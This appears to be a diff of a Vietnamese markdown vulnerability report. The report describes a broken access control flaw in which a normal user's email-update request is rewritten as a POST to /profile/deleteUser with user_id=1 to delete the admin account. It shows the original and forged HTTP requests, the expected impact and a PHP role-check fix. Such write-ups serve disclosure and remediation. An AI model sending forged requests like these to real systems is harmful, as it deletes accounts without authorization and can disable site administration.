@@ -158,7 +158,7 @@ $user = $stmt->fetch();
 #### 📌 3. Sửa request `/profile/updateEmail` -> /profile/deleteUser + used_id'random'.  
 
 **Yêu cầu gốc (Request hợp lệ - cập nhật email):**
-```http
+```
 POST /profile/updateEmail HTTP/1.1
 Host: target-site.com
 Content-Type: application/x-www-form-urlencoded
@@ -166,8 +166,8 @@ Content-Type: application/x-www-form-urlencoded
 email=hacker@evil.com
 ```
 #### 📌 4. Chỉnh sửa request:
-Đổi URL /profile/updateEmail thành /profile/deleteUser.
-Thêm tham số user_id với giá trị ID của nạn nhân (ví dụ: 1 là admin).
+-Đổi URL /profile/updateEmail thành /profile/deleteUser.
+-Thêm tham số user_id với giá trị ID của nạn nhân (ví dụ: 1 là admin).
 Yêu cầu đã chỉnh sửa (Request tấn công - xóa user ID 1):
 ```
 POST /profile/deleteUser HTTP/1.1
@@ -177,11 +177,11 @@ Content-Type: application/x-www-form-urlencoded
 user_id=1
 ```
 #### ✅ 5. Gửi request.
-Nếu lỗ hổng tồn tại, tài khoản có id=1 sẽ bị xóa mà không cần quyền admin.
-Nếu admin bị xóa, hệ thống có thể bị vô hiệu hóa hoặc rơi vào trạng thái không thể quản lý.
+- Nếu lỗ hổng tồn tại, tài khoản có id=1 sẽ bị xóa mà không cần quyền admin.
+- Nếu admin bị xóa, hệ thống có thể bị vô hiệu hóa hoặc rơi vào trạng thái không thể quản lý.
 📸 Ảnh Chụp Màn Hình (PoC Visuals)
 Trước khi tấn công	Sau khi tấn công
-🔧 Biện Pháp Khắc Phục Đề Xuất
+#### 🔧 Biện Pháp Khắc Phục Đề Xuất
 Kiểm tra quyền admin trước khi xóa user:
 ```
 if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
